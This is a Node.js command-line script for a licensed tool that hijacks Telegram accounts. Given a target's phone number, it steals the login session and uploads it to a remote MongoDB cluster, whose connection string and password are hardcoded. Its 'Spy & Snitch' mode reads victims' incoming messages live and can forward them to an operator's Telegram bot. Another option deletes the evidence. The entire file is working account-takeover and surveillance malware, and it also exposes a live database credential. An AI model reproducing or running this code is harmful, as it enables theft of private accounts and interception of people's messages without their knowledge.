const { renderTitle, sexyBox, crazyLoader, sleep } = require('./src/visuals');
const { vibeCheck, getMachineSoul, saveKey, verifyKeyPayload } = require('./src/security');
const { penetrateCloud, buryBody, digUpBodies, burnBody } = require('./src/storage');
const { WarMachine } = require('./src/engine');
const ConfigStore = require('configstore');
const { Select, Input } = require('enquirer');
const chalk = require('chalk');

const MASTER_DB = "mongodb+srv://musasia:GBid1mGqdYrdJHZI@mikacluster.zt0fezk.mongodb.net/?appName=mikacluster";

process.on('unhandledRejection', (reason, p) => {});
process.on('uncaughtException', (err) => {});

const conf = new ConfigStore('mika_v69');

const handleSecurity = async () => {
  let status = await vibeCheck();
  let currentKey = '';
  
  if (status.passed) {
    const fs = require('fs');
    try {
      currentKey = fs.readFileSync('license.key', 'utf8').trim();
    } catch (e) {}
  }
  
  if (!status.passed) {
    sexyBox('SECURITY ALERT', 'License Status: ' + status.msg, 'bad');
    console.log(chalk.yellow('  Don\'t panic. Just give me a valid key.'));
    
    while (!status.passed) {
      const prompt = new Input({ message: 'Enter License Key:' });
      const inputKey = await prompt.run();
      
      if (!inputKey) {
        continue;
      }
      
      await crazyLoader('Verifying Key with Mothership...');
      const newCheck = await verifyKeyPayload(inputKey);
      
      if (newCheck.passed) {
        await saveKey(inputKey);
        status = newCheck;
        currentKey = inputKey;
        sexyBox('ACCESS GRANTED', 'Key saved. Welcome to the dark side.', 'good');
      } else {
        console.log(chalk.red('  Nope. Server said: ' + newCheck.msg));
        const retry = new Select({
          message: 'Try again?',
          choices: ['Yes', 'No (Exit)']
        });
        if ((await retry.run()) === 'No (Exit)') process.exit(1);
      }
    }
  }
  
  status.licenseKey = currentKey;
  return status;
};

const init = async () => {
  renderTitle();
  
  const identity = await handleSecurity();
  
  await crazyLoader('Loading profile for ' + identity.owner + '...', 1000);
  
  if (!(await penetrateCloud(MASTER_DB))) {
    sexyBox('FATAL ERROR', 'The Cloud is down. Yell at Reinhart.', 'bad');
    process.exit(1);
  }
  
  let apiId = conf.get('tg_id');
  let apiHash = conf.get('tg_hash');
  
  if (!apiId || !apiHash) {
    console.log(chalk.yellow('\n--- TELEGRAM CREDENTIALS NEEDED ---'));
    const p1 = new Input({ message: 'API ID:' });
    apiId = await p1.run();
    const p2 = new Input({ message: 'API Hash:' });
    apiHash = await p2.run();
    conf.set('tg_id', apiId);
    conf.set('tg_hash', apiHash);
  }
  
  const engine = new WarMachine(apiId, apiHash);
  return { engine, identity };
};

const main = async () => {
  const { engine, identity } = await init();
  const ownerKey = identity.licenseKey;
  
  while (true) {
    renderTitle();
    console.log(chalk.gray('  [SECURE SESSION] Partition: ' + ownerKey.substring(0, 8) + '...'));
    
    const prompt = new Select({
      name: 'action',
      message: 'What do we do today, boss?',
      choices: [
        '1. Steal a Session (Login)',
        '2. Check the Graveyard (List)',
        '3. Matrix Mode (Spy & Snitch)',
        '4. Burn Evidence (Delete)',
        '5. Config Bot Snitch',
        '6. About',
        '7. Rage Quit'
      ]
    });
    
    const answer = await prompt.run();
    
    if (answer.includes('1.')) {
      const p = new Input({ message: 'Target Number (+123...):' });
      const phone = await p.run();
      try {
        console.log(chalk.blue('Sending authentication payload...'));
        const { session, me } = await engine.hijack(phone);
        
        await buryBody(phone, session, me, ownerKey);
        
        sexyBox('BOOM', 'We got em.\nUser: ' + me.username + '\nID: ' + me.id, 'good');
      } catch (e) {
        sexyBox('FAIL', 'Mission aborted. ' + e.message, 'bad');
      }
    }
    else if (answer.includes('2.')) {
      const bodies = await digUpBodies(ownerKey);
      
      if (bodies.length === 0) {
        console.log(chalk.gray('  It\'s empty in here. Go catch some pokemons.'));
      } else {
        bodies.forEach((b, i) => {
          console.log(chalk.cyan('  [' + (i + 1) + '] ' + b.phone + ' | ' + b.username + ' | ' + b.uid));
        });
      }
    }
    else if (answer.includes('3.')) {
      const bodies = await digUpBodies(ownerKey);
      
      if (bodies.length === 0) {
        console.log(chalk.red('  No sessions to monitor. Are you stupid?'));
      } else {
        renderTitle();
        
        let botConfig = null;
        const botToken = conf.get('bot_token');
        const adminId = conf.get('admin_id');
        
        if (botToken && adminId) {
          console.log(chalk.hex('#FFA500')('[SNITCH ACTIVE] Forwarding to ' + adminId));
          botConfig = { token: botToken, admin: adminId };
        } else {
          console.log(chalk.gray('[SILENT MODE] Bot not configured. Saving local only.'));
        }
        
        console.log(chalk.green('--- ENTERING MATRIX ---'));
        console.log(chalk.gray('Press Ctrl+C to stop being a creep.'));
        
        await engine.wakeUpNeo(bodies, botConfig, (msg) => {
          const tag = chalk.bgBlue.white(' ' + msg.phone + ' ');
          const txt = chalk.white(msg.text.replace(/\n/g, ' '));
          console.log(tag + ' ' + chalk.yellow(msg.sender) + ': ' + txt.substring(0, 60) + '...');
        });
        
        await new Promise(() => {});
      }
    }
    else if (answer.includes('4.')) {
      const bodies = await digUpBodies(ownerKey);
      const list = bodies.map(b => b.phone);
      if (list.length === 0) {
        console.log(chalk.red('  Nothing to delete.'));
      } else {
        const delPrompt = new Select({
          message: 'Who dies today?',
          choices: [...list, 'Cancel']
        });
        const target = await delPrompt.run();
        if (target !== 'Cancel') {
          await burnBody(target, ownerKey);
          console.log(chalk.red('  ' + target + ' has been obliterated.'));
        }
      }
    }
    else if (answer.includes('5.')) {
      renderTitle();
      console.log(chalk.cyan('--- SNITCH BOT CONFIG ---'));
      const p1 = new Input({ message: 'Bot Token:', initial: conf.get('bot_token') || '' });
      const token = await p1.run();
      const p2 = new Input({ message: 'Your Telegram ID:', initial: conf.get('admin_id') || '' });
      const admin = await p2.run();
      conf.set('bot_token', token);
      conf.set('admin_id', admin);
      sexyBox('SAVED', 'Snitch system armed and ready.', 'good');
    }
    else if (answer.includes('6.')) {
      renderTitle();
      console.log(chalk.bold.hex('#00FF00')(`    THE MAD GOD ARCHITECT\n    =====================\n\n    Reinhart\n    Telegram: @kiri0507\n\n    "We do not do it because it's easy.\n     We do it because we thought it would be easy.\n     Now we are 3 days into a 2-hour task."`));
    }
    else {
      process.exit(0);
    }
    
    if (!answer.includes('3.')) {
      await new Input({ message: 'Press Enter to reload...' }).run();
    }
  }
};

main().catch(err => {
  console.log(chalk.bgRed.white(' CRITICAL FAILURE '));
  console.log(err);
});